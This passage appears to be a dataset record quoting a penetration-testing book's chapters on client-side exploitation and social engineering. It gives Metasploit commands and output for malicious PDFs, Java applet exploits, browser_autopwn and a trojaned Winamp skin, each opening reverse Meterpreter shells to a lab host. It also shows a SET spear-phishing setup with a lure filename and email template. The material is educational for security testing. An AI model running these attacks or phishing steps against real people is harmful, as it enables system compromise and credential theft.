handler on 192.168.20.9:4444\n[*] Starting the payload handler... Listing 10-12: Keeping the handler open for multiple sessions\nClient-Side Exploitation 227\nSet ExitOnSession to false in the usual way u. One side effect of this\noption is that if we, say, exploit and start the listener in the foreground,\nit will never close, so we will be stuck without an Msfconsole prompt\nindefinitely. For this reason, Metasploit will complain and note that you\nshould use the -j option with exploit v to run the handler as a job, in the\nbackground. This way you can continue to use Msfconsole while the handler\ncatches any incoming shells in the background. To close the handler in\nthe future, use jobs, followed by kill <job number> as we did in the Aurora\nexample. This exploit and the Aurora browser example discussed earlier both\nrely on a missing security patch. Here we’ve exploited a security vulnerabil-\nity to hijack control of the program and execute malicious code by tricking\nthe user into letting us run malicious code. If the user will allow us to run\ncode, a vulnerability in the PDF software becomes unnecessary. PDF Embedded Executable\nNow for another PDF attack: This time we’ll embed a malicious executable\ninside a PDF. The corresponding Metasploit module is exploit/windows/\nfileformat/adobe_pdf_embedded_exe, as shown in Listing 10-13.\n\nInstead of\nexploiting the software as soon as the PDF is opened, the generated PDF\nwill prompt the user for permission to run the embedded file. The success\nof our attack is contingent on the user allowing our executable to run. msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe\nmsf exploit(adobe_pdf_embedded_exe) > show options\nModule options (exploit/windows/fileformat/adobe_pdf_embedded_exe):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuEXENAME no The Name of payload exe. vFILENAME evil.pdf no The output filename. wINFILENAME yes The Input PDF filename. xLAUNCH_MESSAGE To view the encrypted content please no The message to display in\ntick the \"Do not show this message the File: area\nagain\" box and press Open. --snip--\nListing 10-13: PDF embedded EXE module\nThe module lets us specify a prebuilt executable file with the EXENAME u\noption. If we don’t set this option, we can embed an .exe file created from\nwhatever payload we select. We can again change the filename to anything\nwe like or leave the value as the default v. To use this module, we must\nuse an input PDF for the INFILENAME w option. The LAUNCH_MESSAGE x option\nis the text that will be shown to the user as part of the prompt to run the\nexecutable. Set the relevant options, as shown in Listing 10-14. 228 Chapter 10\nmsf exploit(adobe_pdf_embedded_exe) > set INFILENAME /usr/share/set/readme/User_Manual.pdfu\nINFILENAME => /usr/share/set/readme/User_Manual.pdf\nmsf exploit(adobe_pdf_embedded_exe) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(adobe_pdf_embedded_exe) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(adobe_pdf_embedded_exe) > exploit\n[*] Reading in '/usr/share/set/readme/User_Manual.pdf'... [*] Parsing '/usr/share/set/readme/User_Manual.pdf'... [*] Using 'windows/meterpreter/reverse_tcp' as payload... [*] Parsing Successful. Creating 'evil.pdf' file... [+] evil.pdf stored at /root/.msf4/local/evil.pdfv\nListing 10-14: Setting module options and creating the malicious PDF\nWe’ll use a PDF included with Kali Linux for our example: the Metasploit\nuser guide at /user/share/set/readme/User_Manual.pdf u. The generated PDF is\nagain stored in the /root/msf4/local/ directory v. (Be sure to set up a handler\nfor the payload with the multi/handler module before opening the PDF on\nthe Windows XP target. For a refresher, see Listing 10-11.)\nnote The previous exploit may have left Adobe Reader in a bad state, so you may need to\nrestart Windows XP to get it to properly load the new PDF. When the malicious PDF is opened, the user sees a warning like the one\nshown in Figure 10-1. The user must click Open for the embedded executable\nto run. This attack depends on users being willing to click through this warning. Figure 10-1: PDF embedded executable user warning\nClient-Side Exploitation 229\nOnce you click Open in the PDF warning, the payload will run, and you\nwill receive a session. Java Exploits\nJava vulnerabilities are a prevalent client-side attack vector. In fact, some\nexperts suggest that in light of the security issues that plague Java, users\nshould uninstall or disable the software in their browsers. One thing that makes Java attacks so powerful is that one exploit can\ngain access to multiple platforms. Windows, Mac, and even Linux systems\nrunning the Java Runtime Environment (JRE) in a browser can all be\nexploited by exactly the same exploit when that browser opens a malicious\npage. Here are some sample exploits. Java Vulnerability\nAs exhibit number one, we’ll use the Metasploit module exploit/multi/browser/\njava_jre17_jmxbean, as shown in Listing 10-15. Use of this module is similar\nto that of the Internet Explorer Aurora exploit shown earlier in this chap-\nter. Metasploit sets up a malicious server to exploit this cross-platform vul-\nnerability on any browser that arrives at the page. Any browser running Java\nversion 7 before update 11 is affected. msf > use exploit/multi/browser/java_jre17_jmxbean\nmsf exploit(java_jre17_jmxbean) > show options\nModule options (exploit/multi/browser/java_jre17_jmxbean):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address\non the local machine or 0.0.0.0\nSRVPORT 8080 yes The local port to listen on. --snip--\nURIPATH no The URI to use for this exploit (default is random)\nExploit target:\nId Name\n-- ----\n0 Generic (Java Payload)\nmsf exploit(java_jre17_jmxbean) > set SRVHOST 192.168.20.9\nSRVHOST => 10.0.1.9\nmsf exploit(java_jre17_jmxbean) > set SRVPORT 80\nSRVPORT => 80\nmsf exploit(java_jre17_jmxbean) > set URIPATH javaexploit\nURIPATH => javaexploit\nmsf exploit(java_jre17_jmxbean) > show payloadsu\n230 Chapter 10\nCompatible Payloads\n===================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\n--snip--\njava/meterpreter/bind_tcp normal Java Meterpreter, Java Bind TCP\nStager\njava/meterpreter/reverse_http normal Java Meterpreter, Java Reverse HTTP\nStager\njava/meterpreter/reverse_https normal Java Meterpreter, Java Reverse\nHTTPS Stager\njava/meterpreter/reverse_tcp normal Java Meterpreter, Java Reverse TCP\nStager\njava/shell_reverse_tcp normal Java Command Shell, Reverse TCP\nInline\n--snip--\nmsf exploit(java_jre17_jmxbean) > set payload java/meterpreter/reverse_httpv\npayload => java/meterpreter/reverse_http\nListing 10-15: Setting up a Java exploit\nSet the options to match your environment. Set the SRVHOST option\nto the local IP address, and change the SRVPORT, if you would like. Set the\nURIPATH to something that will be easy to type in your target browser. Notice that because this exploit is multi-platform and the code execu-\ntion takes place entirely inside the JRE, our payload options are Java-based. The usual suspects are all here, from staged payloads, inline payloads, bind\nshells, reverse shells, Meterpreter, and so on, as shown in the list of payloads\nat u. We’ll use the payload java/meterpreter/reverse_http, which uses legitimate\nHTTP traffic v. Its options are shown in Listing 10-16. msf exploit(java_jre17_jmxbean) > show options\nModule options (exploit/multi/browser/java_jre17_jmxbean):\n--snip--\nPayload options (java/meterpreter/reverse_http):\nName Current Setting Required Description\n---- --------------- -------- -----------\nLHOST yes The local listener hostname\nLPORT 8080 yes The local listener port\nExploit target:\nId Name\n-- ----\n0 Generic (Java Payload)\nClient-Side Exploitation 231\nmsf exploit(java_jre17_jmxbean) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(java_jre17_jmxbean) > exploit\n[*] Exploit running as background job. [*] Started HTTP reverse handler on http://192.168.20.9:8080/\n[*] Using URL: http://192.168.20.9:80/javaexploit\n[*] Server started. msf exploit(java_jre17_jmxbean) > [*] 192.168.20.12 java_jre17_jmxbean - handling\nrequest for /javaexploit\n[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/\n[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar\n[*] 192.168.20.12 java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar\n[*] 192.168.20.12:49188 Request received for /INITJM... [*] Meterpreter session 1 opened (192.168.20.9:8080 -> 192.168.20.12:49188) at 2015-05-05\n19:15:19 -0400\nListing 10-16: Exploiting a Java vulnerability with an HTTP payload\nThese options should look familiar. The default LPORT option is now\n8080 instead of 4444. Notice that both SRVPORT and LPORT default to 8080,\nso we’ll need to change at least one of them. After you’ve finished setting options, start the exploit server and browse\nto the malicious page from your Windows 7 target. Either Internet Explorer\nor Mozilla Firefox will fall victim to this attack as long as you have enabled\nthe vulnerable Java browser plugin. One of the great features of the HTTP and HTTPS Meterpreter pay-\nloads, aside from being legitimate HTTP and HTTPS traffic and thus\nby passing even some traffic-inspecting filters, is their ability to reattach to\na dropped session. (Network problems can cause sessions to spontaneously\ndie—a big annoyance for pentesters.) We’ll examine other ways to gain\npersistent access in Chapter 13, but for now let’s detach our Meterpreter\nsession, as shown in Listing 10-17. msf exploit(java_jre17_jmxbean) > sessions -i 1\n[*] Starting interaction with 1... meterpreter > detach\n[*] 10.0.1.16 - Meterpreter session 1 closed. Reason: User exit\nmsf exploit(java_jre17_jmxbean) >\n[*] 192.168.20.12:49204 Request received for /WzZ7_vgHcXA6kWjDi4koK/... [*] Incoming orphaned session WzZ7_vgHcXA6kWjDi4koK, reattaching... [*] Meterpreter session 2 opened (192.168.20.9:8080 -> 192.168.20.12:49204) at\n2015-05-05 19:15:45 -0400 u\nListing 10-17: Detaching the HTTP Meterpreter session\nAs you can see, the handler for the HTTP Meterpreter payload is still\nrunning in the background. Wait a few seconds, and you should see a new\nsession open without the user needing to revisit the attack page as shown\nat u. Unless the session has been formally exited, the payload will continue\n232 Chapter 10\nto try to connect back to Metasploit. (You can specify how long the ses-\nsion tries to reconnect with the SessionCommunicationTimeOut parameter, an\nadvanced option for the payload.)\nBut what if your pentest target is diligent in updating Java, and there\nare currently no zero-days for the software floating around the Internet? Signed Java applet\nMuch like the attack against PDF users discussed in “PDF Embedded\nExecutable” on page 228, we can bypass the need for an unpatched Java\nvulnerability by simply asking users to allow us to run malicious code. You’ve probably seen browser warnings like, “This site would like to run\nthis thing in your browser, how would you like to proceed?” Sometimes\neven security-savvy users can be convinced to just say “Yes” and bypass this\nwarning without further investigation if they can be convinced that what’s\non the other side is useful. The module we’ll use for this example is exploit/multi/browser/java_\nsigned_applet. As the name implies, this module will create a malicious Java\napplet, as shown in Listing 10-18. msf exploit(java_jre17_jmxbean) > use exploit/multi/browser/java_signed_applet\nmsf exploit(java_signed_applet) > show options\nModule options (exploit/multi/browser/java_signed_applet):\nName Current Setting Required Description\n---- --------------- -------- -----------\nAPPLETNAME SiteLoader yes The main applet's class name. uCERTCN SiteLoader yes The CN= value for the certificate. Cannot contain\n',' or '/'\nSRVHOST 0.0.0.0 yes The local host to listen on.\n\nThis must be an\naddress on the local machine or 0.0.0.0\nSRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections\nSSLCert no Path to a custom SSL certificate (default is\nrandomly generated)\nSSLVersion SSL3 no Specify the version of SSL that should be used\n(accepted: SSL2, SSL3, TLS1)\nvSigningCert no Path to a signing certificate in PEM or PKCS12\n(.pfx) format\nSigningKey no Path to a signing key in PEM format\nSigningKeyPass no Password for signing key (required if SigningCert\nis a .pfx)\nURIPATH no The URI to use for this exploit (default is\nrandom)\nExploit target:\nId Name\n-- ----\nw1 Windows x86 (Native Payload)\nClient-Side Exploitation 233\nmsf exploit(java_signed_applet) > set APPLETNAME BulbSec\nAPPLETNAME => Bulb Security\nmsf exploit(java_signed_applet) > set SRVHOST 192.168.20.9\nSRVHOST => 192.168.20.9\nmsf exploit(java_signed_applet) > set SRVPORT 80\nSRVPORT => 80\nListing 10-18: Metasploit signed Java applet module\nOlder versions of Java will allow us to use the CERTCN option shown at u to\nsay that the applet is signed by any entity that we choose. Newer versions of\nJava, like the one installed on the Windows 7 target, will say that the signer\nis unknown unless we sign the applet with a trusted signing certificate,\nwhich we can specify at v. If this option is set, it will override the CERTCN\noption. If we have a trusted signing certificate or we’ve compromised a cer-\ntificate from our target, we can make our applet look more legitimate, but\nwe’ll leave our applet self-signed for this example. As shown at w, the default target for this module is a Windows system. However, as shown in Listing 10-19, we can use payloads for other platforms\nrunning JRE. msf exploit(java_signed_applet) > show targets\nExploit targets:\nId Name\n-- ----\nu0 Generic (Java Payload)\n1 Windows x86 (Native Payload)\n2 Linux x86 (Native Payload)\n3 Mac OS X PPC (Native Payload)\n4 Mac OS X x86 (Native Payload)\nmsf exploit(java_signed_applet) > set target 0\ntarget => 0\nmsf exploit(java_signed_applet) > set payload java/meterpreter/reverse_tcp\npayload => java/meterpreter/reverse_tcp\nmsf exploit(java_signed_applet) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(java_signed_applet) > exploit\n[*] Exploit running as background job. [*] Started reverse handler on 192.168.20.9:4444\n[*] Using URL: http://192.168.20.9:80/Dgrz12PY\n[*] Server started. Listing 10-19: Using a Java payload\n234 Chapter 10\nAs with other Java exploits, we can make this attack multi-platform. We\ncan change the target to Linux or Mac OS, or use a Java payload u that\nwill target them all. note As with our PDF examples, the previous exploit has left Java in a bad state, and you\nmay need to restart Windows 7 before attempting to run the applet. Browse to the Metasploit server from your Windows 7 target, and you\nshould be prompted to run the applet, as shown in Figure 10-2. The secu-\nrity warning informs you that if this applet is malicious, it will have access\nto the system and lets you know you should run the application only if\nthe publisher is trusted. Because we didn’t use a signing certificate that is\ntrusted by the browser certificate chain, the warning says in big letters that\nthe publisher is unknown. This should stop anyone from running the mali-\ncious applet, right? Figure 10-2: Java applet attack\nDespite the warnings, the Social-Engineer Toolkit (which we’ll explore\nin the next chapter) claims that this attack is one of the most successful of\nthe many available, even though it doesn’t rely on any unpatched vulner-\nability in Java or the underlying operating system. browser_autopwn\nThe browser_autopwn module is another client-side exploitation option\navailable in Metasploit. Although it’s sometimes considered cheating, this\nmodule loads all the browser and browser add-on modules that it knows\nClient-Side Exploitation 235\nof (including Java, Flash, and so on) and waits for a browser to connect to\nthe server. Once the browser connects, the server fingerprints the browser\nand serves up all the exploits it thinks are likely to succeed. An example is\nshown in Listing 10-20. msf > use auxiliary/server/browser_autopwn\nmsf auxiliary(browser_autopwn) > show options\nModule options (auxiliary/server/browser_autopwn):\nName Current Setting Required Description\n---- --------------- -------- -----------\nLHOST yes The IP address to use for reverse-connect payloads\nSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address\non the local machine or 0.0.0.0\nSRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections\nSSLCert no Path to a custom SSL certificate (default is randomly\ngenerated)\nSSLVersion SSL3 no Specify the version of SSL that should be used\n(accepted: SSL2, SSL3, TLS1)\nURIPATH no The URI to use for this exploit (default is random)\nmsf auxiliary(browser_autopwn) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf auxiliary(browser_autopwn) > set URIPATH autopwn\nURIPATH => autopwn\nmsf auxiliary(browser_autopwn) > exploit\n[*] Auxiliary module execution completed\n[*] Setup\nmsf auxiliary(browser_autopwn) >\n[*] Obfuscating initial javascript 2015-03-25 12:55:22 -0400\n[*] Done in 1.051220065 seconds\n[*] Starting exploit modules on host 192.168.20.9... --snip--\n[*] --- Done, found 16 exploit modules\n[*] Using URL: http://0.0.0.0:8080/autopwn\n[*] Local IP: http://192.168.20.9:8080/autopwn\n[*] Server started. Listing 10-20: Starting browser_autopwn\nOur options for this module are the usual client-side attacks. As shown\nhere, I’ve set the LHOST for my shells to call back to Kali’s IP address, and\nURIPATH to something easy to remember (autopwn). Note that we don’t need\nto set any payloads here; as the individual modules are loaded, Metasploit\nsets the payload options appropriately. 236 Chapter 10\nWith the server started, browse to the malicious page from a web\nbrowser. I used Internet Explorer on my Windows 7 target as shown in\nListing 10-21. [*] 192.168.20.12 browser_autopwn - Handling '/autopwn'\n[*] 192.168.20.12 browser_autopwn - Handling '/autopwn?sessid=TWljcm9zb2Z0IFdpbmRvd3M6NzpTUDE6\nZW4tdXM6eDg2Ok1TSUU6OC4wOg%3d%3d'\n[*] 192.168.20.12 browser_autopwn - JavaScript Report: Microsoft Windows:7:SP1:en-us:x86:\nMSIE:8.0: u\n[*] 192.168.20.12 browser_autopwn - Responding with 14 exploits v\n[*] 192.168.20.12 java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation\nVulnerability\n--snip--\nmsf auxiliary(browser_autopwn) > sessions -l\nActive sessions\n===============\nId Type Information Connection\n-- ---- ----------- ----------\n1 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->\n\n192.168.20.12:49195 (192.168.20.12)\n2 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->\n\n192.168.20.12:49202 (192.168.20.12)\n3 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->\n\n192.168.20.12:49206 (192.168.20.12)\n4 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->\n\n192.168.20.12:49209 (192.168.20.12)\nListing 10-21: Autopwning a browser\nAs you can see Metasploit notices my browser and attempts to detect\nits version and running software u. It then sends all the exploits it thinks\nmight be effective v. Once all is said and done, run sessions -l to see how things turned out. In my case, I received four new sessions. Not bad for so little work. As you\nmight expect though, all of those exploits overwhelmed the browser and it\ncrashed. (Luckily, all of our sessions were automatically migrated.)\nThough browser_autopwn is not nearly as stealthy or elegant as perform-\ning reconnaissance and then choosing a particular exploit likely to work\nagainst a target, it can be a real help in a pinch, which is why it’s worth hav-\ning in your pentesting arsenal. Winamp\nSo far our client-side attacks have basically followed the same pattern. We\ngenerate a malicious file that exploits a vulnerability in the client software\nor prompts the user for permission to run malicious code. The user opens\nthe file with the relevant program, and we get a session in Metasploit. Now\nfor something a bit different. Client-Side Exploitation 237\nIn this example, we trick the user into replacing a configuration file\nfor the Winamp music player program. When the user next opens the pro-\ngram, the evil configuration file will be processed regardless of which music\nfile the user opens. The Metasploit module we’ll use is exploit/windows/\nfileformat/winamp_maki_bof, which exploits a buffer overflow issue in\nWinamp version 5.55. As you can see with show options in Listing 10-22, this module has no\noptions to set; all we need is a Windows payload. The module generates a\nmalicious Maki file for use with Winamp skins. As with our PDF examples,\nit’s up to us to serve the file and set up a handler for the payload. msf > use exploit/windows/fileformat/winamp_maki_bof\nmsf exploit(winamp_maki_bof) > show options\nModule options (exploit/windows/fileformat/winamp_maki_bof):\nName Current Setting Required Description\n---- --------------- -------- -----------\nExploit target:\nId Name\n-- ----\n0 Winamp 5.55 / Windows XP SP3 / Windows 7 SP1\nmsf exploit(winamp_maki_bof) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(winamp_maki_bof) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(winamp_maki_bof) > exploit\n[*] Creating 'mcvcore.maki' file ... [+] mcvcore.maki stored at /root/.msf4/local/mcvcore.maki\nListing 10-22: Metasploit Winamp exploit\nChoose a compatible Windows payload as shown. Once the malicious\nMaki file has been generated, copy it to the Apache web server directory, and\nset up a payload handler. (An example of setting up the handler is included\nin Listing 10-11 on page 227.) Now we need to package this malicious file in\nsuch a way that a user may be convinced to load it in Winamp. We can create\na new Winamp skin by copying one of the skins packaged with Winamp. We\ncan replace the mcvcore.maki file from our example skin with our malicious\none. It doesn’t matter what our skin actually looks like, because it will cause\nWinamp to hang and send us our session in Metasploit. 238 Chapter 10\nIn Windows 7, make a copy of the default Bento Winamp skin folder\nfrom C:\\Program Files\\Winamp\\Skins and copy it to Kali. Rename the folder\nBento to Rocketship. Replace the file Rocketship\\scripts\\mcvcore.maki with the\nmalicious file we just created in Metasploit. Zip the folder and copy it to\nthe web server. In the next chapter we will look at methods of creating\nbelievable social-engineering campaigns, but suffice it to say, if we can\nconvince users that this malicious skin will make their Winamp look like\na rocket ship, we might be able to convince users to install it. Switch to Windows 7, download the zipped skin from the Kali web\nserver, unzip it, and save the folder to C:\\Program Files\\Winamp\\Skins as\nshown in Figure 10-3. Figure 10-3: Installing the malicious Winamp skin\nNow open Winamp, go to Options4Skins, and choose Rocketship, as\nshown in Figure 10-4. Once you select the malicious skin, Winamp will appear to close, and\nyou will receive a session in your Metasploit handler. Client-Side Exploitation 239\nFigure 10-4: Using the malicious skin\nsummary\nThe attacks we’ve seen in this chapter target software that is not listening\non a network port. We attacked browsers, PDF viewers, the Java browser\nplugin, and a music player. We generated malicious files that trigger a\nvulnerability in the client-side software when opened by the user, and we\nlooked at examples that ask the user for permission to run malicious code\ninstead of relying on an unpatched vulnerability. The Internet can be a scary place for client-side software. Some of the\nexploits discussed in this chapter were seen in the wild before a patch was\nissued by the vendors. In fact, the Java exploit we used in “Java Vulnerability”\non page 230 was still a zero-day vulnerability when the Metasploit module\nwas added to the framework. Anyone using Java 7 could run afoul of a mali-\ncious site, even if his or her machine was fully patched, and all an attacker\nhad to do was use Metasploit to perform a successful attack. Of course, disabling or uninstalling Java fixes this problem in the event\nof a zero-day exploit running rampant on the Internet, but that might not\nbe feasible for all users and organizations. Though not all sites use Java,\npopular online meeting software such as WebEx and GoToMeeting require\nJava, and the virtual classroom software Blackboard has Java components as\n240 Chapter 10\nwell. A lot of network/security appliances actually require network/security\nadmins to run outdated versions of Java, which makes them perfect tar-\ngets for client-side attacks. Most readers can probably think of at least one\nsite that complains if Java is not installed. Client-side software is necessary to perform day-to-day tasks in any\norganization, but this software should not be overlooked when evaluat-\ning security risks. Keeping all client-side software up-to-date with the lat-\nest patches can be a daunting task on your personal computer, much less\non the computers of an entire organization. Even organizations that are\ndoing a good job of applying important Windows security fixes may miss\nan update to Java or Adobe Reader and leave company workstations open to\nclient-side attacks. All of the attacks in this chapter depend on a legitimate user taking\naction on the target systems. Although we’ve seen what can happen when\nusers are tricked into opening malicious files, we’ve yet to look at the\ntricks used to make people open those files. In the next chapter we’ll study\nsocial engineering—that is, ways of tricking users into performing harm-\nful actions such as opening a malicious file, entering credentials into an\nattacker-owned site, or giving out sensitive information over the phone. Client-Side Exploitation 241\n11\nsoCial engineering\nIt is a common saying in information security that\nusers are the vulnerability that can never be patched. Put all the security controls in place that you want,\nbut if an employee can be convinced to give up sensi-\ntive company information, it is all for naught. In fact,\nmany of the most famous hacks include no system\nexploitation at all. For example, consider notorious hacker Kevin Mitnick. Many of Mitnick’s\nmost famous exploits came down to walking into a building, convincing\nthe security guard he had permission to be there, and then walking out\nwith what he wanted. This kind of attack, called social engineering, exploits\nhuman vulnerabilities: a desire to be helpful, unawareness of security poli-\ncies, and so on. Social-engineering attacks can involve complex technical requirements\nor no technology at all. A social engineer can buy a cable guy uniform at\nthe thrift store and potentially walk into an organization, and even into the\nserver room. The IT help desk can receive a frantic call from the boss’s\nboss’s assistant, who claims to have locked himself out of his webmail\naccount. People generally want to be helpful, so unless there is a secure\npolicy in place, the help desk worker may read back the password over the\nphone or set it to a default value, even though the caller is not who he says\nhe is. A common vector for social-engineering attacks is email. If you are ever\nshort on entertainment at work, check out your email spam folder. Among\nthe advertisements to make some things bigger and others smaller, you will\nfind people trying desperately to give you all their money. I firmly believe\nthat if you can find the one African prince who really does want to give you\nhis fortune, it will be worth all those times your bank account got hacked\nfrom answering phishing emails. Joking aside, attempting to trick a user\ninto giving up sensitive information by posing as a trusted person via email\nor other electronic means is known as a phishing attack. Phishing emails can\nbe used to lure targets to visit malicious sites or download malicious attach-\nments, among other things. Social-engineering attacks are the missing\nelement needed to trick users into falling victim to the client-side attacks we\nstudied in Chapter 10. Companies should put time and effort into training all employees\nabout social-engineering attacks. No matter what sort of security technolo-\ngies you put in place, employees have to be able to use their workstations,\ntheir mobile devices, and so on to get their job done. They will have access\nto sensitive information or security controls that, in the wrong hands, could\nharm the organization. Some security-awareness training may seem obvi-\nous, like “Don’t share your password with anyone” and “Check someone’s\nbadge before you hold the door to a secure area for him or her.” Other\nsecurity awareness may be new to many employees. For instance, on some\npentesting engagements, I’ve had great success leaving USB sticks in the\nparking lot or DVDs labeled “Payroll” on the bathroom floor. Curious users\nstart plugging these in, opening files, and giving me access to their systems. Security-awareness training about malicious files, USB switchblades, and\nother attacks can help stop users from falling victim to these types of social-\nengineering attacks. the social-engineer toolkit\nTrustedSec’s Social-Engineer Toolkit (SET), an open source Python-driven\ntool, is designed to help you perform social-engineering attacks during pen-\ntests. SET will help you create a variety of attacks such as email phishing\ncampaigns (designed to steal credentials, financial information, and so on\nusing specially targeted email) and web-based attacks (such as cloning a\nclient website and tricking users into entering their login credentials). 244 Chapter 11\nSET comes preinstalled in Kali Linux. To start SET in Kali Linux,\nenter setoolkit at a prompt, as shown in Listing 11-1. We’ll use SET to run\nsocial-engineering attacks, so enter a 1 at the prompt to move to the Social-\nEngineering Attacks menu. You will be prompted to accept the terms of\nservice. root@kali:~# setoolkit\n--snip--\nSelect from the menu:\n1) Social-Engineering Attacks\n2) Fast-Track Penetration Testing\n3) Third Party Modules\n--snip--\n99) Exit the Social-Engineer Toolkit\nset> 1\nListing 11-1: Starting SET\nIn this chapter we’ll look at just a few of the SET attacks that I use regu-\nlarly on pentesting engagements. We’ll begin with spear-phishing attacks,\nwhich allow us to deliver attacks via email. spear-Phishing attacks\nThe Social-Engineering Attacks menu gives us several attack options, as\nshown in Listing 11-2. We’ll create a spear-phishing attack, which will allow\nus to create malicious files for client-side attacks (like the ones covered in\nChapter 10), email them, and automatically set up a Metasploit handler to\ncatch the payload. Select from the menu:\n1) Spear-Phishing Attack Vectors u\n2) Website Attack Vectors\n3) Infectious Media Generator\n4) Create a Payload and Listener\n5) Mass Mailer Attack\n--snip--\n99) Return back to the main menu. set> 1\nListing 11-2: Choose Spear-Phishing Attack Vectors\nSelect option 1 to choose Spear-Phishing Attack Vectors u. The Spear-\nPhishing Attack Vectors menu is shown in Listing 11-3.",
    "question": "What are some examples of client-side exploitation techniques and how do they differ from server-side vulnerabilities in the context of penetration testing?",
    "summary": "This chapter discusses client-side exploitation techniques that target software not listening on network ports, such as browsers, PDF viewers, Java, and Winamp. It explains how to generate malicious files that exploit vulnerabilities or prompt users to run them, and highlights the importance of keeping client-side software updated. The chapter also covers the use of Metasploit modules for these attacks, including reverse connections, HTTP/HTTPS payloads, and automated tools like browser_autopwn. Finally, it emphasizes that client-side attacks often rely on social engineering to trick users into opening malicious content."
  },
  {
    "start": 74,
    "end": 79,
    "text": "1) Perform a Mass Email Attack u\n2) Create a FileFormat Payload v\n3) Create a Social-Engineering Template w\nSocial Engineering 245\n--snip--\n99) Return to Main Menu\nset:phishing> 1\nListing 11-3: Choose Perform a Mass Email Attack\nThe first option, Perform a Mass Email Attack u, allows us to send a mali-\ncious file to a predefined email address or list of addresses as well as set up\na Metasploit listener for the selected payload. The second option, Create a\nFileFormat Payload v, lets us create a malicious file with a Metasploit payload. The third option allows us to create a new email template w to be used in\nSET attacks. Choose option 1 to create an email attack. (We’ll have the option to\nsend a single email or mass email later.)\nChoosing a Payload\nNow to choose a payload. A selection of payload options is shown in\nListing 11-4. ********** PAYLOADS **********\n1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)\n--snip--\n12) Adobe util.printf() Buffer Overflow u\n--snip--\n20) MSCOMCTL ActiveX Buffer Overflow (ms12-027)\nset:payloads> 12\nListing 11-4: Choose a spear-phishing attack\nFor example, to re-create our PDF attack from Chapter 10, choose\noption 12: Adobe util.printf() Buffer Overflow u. (SET includes many\nMetasploit attacks, as well as its own, specific attacks.)\nYou should be prompted to choose a payload for your malicious file\n(see Listing 11-5). 1) Windows Reverse TCP Shell Spawn a command shell on victim and\nsend back to attacker\n2) Windows Meterpreter Reverse_TCP Spawn a meterpreter shell on victim\nand send back to attacker u\n--snip--\nset:payloads> 2\nListing 11-5: Choose a payload\n246 Chapter 11\nThe usual suspects are all here, including windows/meterpreter/reverse_tcp,\nwhich appears in a more human-readable form as Windows Meterpreter Reverse_\nTCP u. We’ll choose this option for our sample attack. Setting Options\nSET should prompt for the relevant options for the payload, in this case the\nLHOST and LPORT. If you’re not very familiar with Metasploit, just answer the\nprompts to set the correct options automatically, as shown in Listing 11-6. Set the payload listener to the IP address of Kali Linux. Leave the port to\nconnect back on to the default (443). set> IP address for the payload listener: 192.168.20.9\nset:payloads> Port to connect back on [443]:\n[-] Defaulting to port 443... [-] Generating fileformat exploit... [*] Payload creation complete. [*] All payloads get sent to the /usr/share/set/src/program_junk/template.pdf\ndirectory\n[-] As an added bonus, use the file-format creator in SET to create your\nattachment. Listing 11-6: Setting options\nNaming Your File\nNext you should be prompted to name your malicious file. Right now the attachment will be imported with filename of 'template.whatever'\nDo you want to rename the file? example Enter the new filename: moo.pdf\n1. Keep the filename, I don't care. 2. Rename the file, I want to be cool. u\nset:phishing> 2\nset:phishing> New filename: bulbsecuritysalaries.pdf\n[*] Filename changed, moving on... Select option 2 u to rename the malicious PDF, and enter the filename\nbulbsecuritysalaries.pdf. SET should continue. Single or Mass Email\nNow to decide whether to have SET send our malicious file to a single email\naddress or a list of addresses, as shown in Listing 11-7. Social Engineering 247\nSocial Engineer Toolkit Mass E-Mailer\nWhat do you want to do:\n1. E-Mail Attack Single Email Address u\n2. E-Mail Attack Mass Mailer v\n99. Return to main menu. set:phishing> 1\nListing 11-7: Choosing to perform a single email address attack\nChoose the single email address option u for now. (We’ll look at send-\ning mass email v in “Mass Email Attacks” on page 253.)\nCreating the Template\nWhen crafting the email, we can use one of SET’s email templates or enter\ntext for one-time use in the template. In addition, if you choose Create a\nSocial-Engineering Template, you can create a template that you can reuse. Many of my social engineering customers like me to use fake emails\nthat appear to come from a company executive or the IT manager, announc-\ning new website functionality or a new company policy. Let’s use one of\nSET’s email templates as an example to fake this email now, as shown in\nListing 11-8; we’ll create our own email later in the chapter. Do you want to use a predefined template or craft a one time email\ntemplate. 1. Pre-Defined Template\n2. One-Time Use Email Template\nset:phishing> 1\n[-] Available templates:\n1: Strange internet usage from your computer\n2: Computer Issue\n3: New Update\n4: How long has it been\n5: WOAAAA!!!!!!!!!! This is crazy... 6: Have you seen this? 7: Dan Brown's Angels & Demons\n8: Order Confirmation\n9: Baby Pics\n10: Status Report\nset:phishing> 5\nListing 11-8: Choosing an email template\nChoose 1 for Pre-Defined Template, then choose template 5. Setting the Target\nNow SET should prompt you for your target email address and a mail server\nfor use in delivering the attack email. You can use your own mail server, one\n248 Chapter 11\nthat is misconfigured to allow anyone to send mail (called an open relay),\nor a Gmail account, as shown in Listing 11-9. Let’s use Gmail for this attack\nby choosing option 1. set:phishing> Send email to: georgia@metasploit.com\n1. Use a gmail Account for your email attack. 2. Use your own server or open relay\nset:phishing> 